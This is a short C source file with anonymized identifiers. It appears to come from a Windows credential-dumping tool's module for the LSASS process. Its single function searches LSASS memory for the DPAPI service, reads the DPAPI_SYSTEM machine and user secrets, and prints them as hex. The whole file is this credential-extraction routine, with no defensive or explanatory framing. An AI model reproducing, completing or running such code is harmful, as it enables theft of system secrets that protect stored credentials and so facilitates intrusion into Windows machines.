
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_15__ TYPE_7__ ;
typedef struct TYPE_14__ TYPE_6__ ;
typedef struct TYPE_13__ TYPE_3__ ;
typedef struct TYPE_12__ TYPE_2__ ;
typedef struct TYPE_11__ TYPE_1__ ;


typedef int wchar_t ;
typedef int rgbSystemCredUser ;
typedef int rgbSystemCredMachine ;
typedef int fSystemCredsInitialized ;
struct TYPE_15__ {int isInit; scalar_t__ isPresent; } ;
struct TYPE_11__ {scalar_t__ BuildNumber; } ;
struct TYPE_14__ {TYPE_1__ osContext; int * hLsassMem; } ;
struct TYPE_13__ {int ** address; int * member_1; int * member_0; } ;
struct TYPE_12__ {TYPE_7__ Module; } ;
typedef void* PVOID ;
typedef TYPE_2__* PKUHL_M_SEKURLSA_PACKAGE ;
typedef int NTSTATUS ;
typedef TYPE_3__ KULL_M_MEMORY_ADDRESS ;
typedef int BYTE ;
typedef int * BOOL ;


 int FUNC_0 (int ) ;
 int VAR_0 ;
 scalar_t__ VAR_1 ;
 scalar_t__ FUNC_1 (int ) ;
 int FUNC_2 (char*) ;
 int VAR_2 ;
 int VAR_3 ;
 TYPE_6__ VAR_4 ;
 int FUNC_3 (char*) ;
 int FUNC_4 () ;
 TYPE_2__ VAR_5 ;
 TYPE_2__ VAR_6 ;
 scalar_t__ FUNC_5 (TYPE_6__*,TYPE_7__*,int ,int ,void**,void**,void**,int *) ;
 scalar_t__ FUNC_6 (TYPE_3__*,TYPE_3__*,int) ;
 int FUNC_7 (int *,int,int ) ;

NTSTATUS FUNC_8(int VAR_7, wchar_t * VAR_8[])
{
 NTSTATUS VAR_9 = FUNC_4();
 KULL_M_MEMORY_ADDRESS VAR_10 = {((void*)0), VAR_4.hLsassMem}, VAR_11 = {((void*)0), &VAR_0};
 PKUHL_M_SEKURLSA_PACKAGE VAR_12 = (VAR_4.osContext.BuildNumber >= VAR_1) ? &VAR_6 : &VAR_5;
 PVOID VAR_13 = ((void*)0), VAR_14 = ((void*)0), VAR_15 = ((void*)0);
 BOOL VAR_16;
 BYTE VAR_17, VAR_18[VAR_2], VAR_19[VAR_2];

 if(FUNC_1(VAR_9))
 {
  if(VAR_12->Module.isPresent)
  {
   VAR_17 = VAR_12->Module.isInit;
   if(FUNC_5(&VAR_4, &VAR_12->Module, VAR_3, FUNC_0(VAR_3), &VAR_13, &VAR_14, &VAR_15, ((void*)0)))
   {
    VAR_12->Module.isInit = VAR_17;
    VAR_11.address = &VAR_16;
    VAR_10.address = VAR_13;
    if(FUNC_6(&VAR_11, &VAR_10, sizeof(VAR_16)))
    {
     if(VAR_16)
     {
      FUNC_3(L"DPAPI_SYSTEM\n");
      VAR_11.address = &VAR_18;
      VAR_10.address = VAR_14;
      if(FUNC_6(&VAR_11, &VAR_10, sizeof(VAR_18)))
      {
       VAR_11.address = &VAR_19;
       VAR_10.address = VAR_15;
       if(FUNC_6(&VAR_11, &VAR_10, sizeof(VAR_19)))
       {
        FUNC_3(L"full: ");
        FUNC_7(VAR_18, sizeof(VAR_18), 0);
        FUNC_7(VAR_19, sizeof(VAR_19), 0);
        FUNC_3(L"\nm/u : ");
        FUNC_7(VAR_18, sizeof(VAR_18), 0);
        FUNC_3(L" / ");
        FUNC_7(VAR_19, sizeof(VAR_19), 0);
        FUNC_3(L"\n");
       }
      }
     }
     else FUNC_2(L"Not initialized!\n");
    }
   }
   else FUNC_2(L"Pattern not found in DPAPI service\n");
  }
  else FUNC_2(L"DPAPI service not in LSASS memory\n");
 }
 return VAR_9;
}
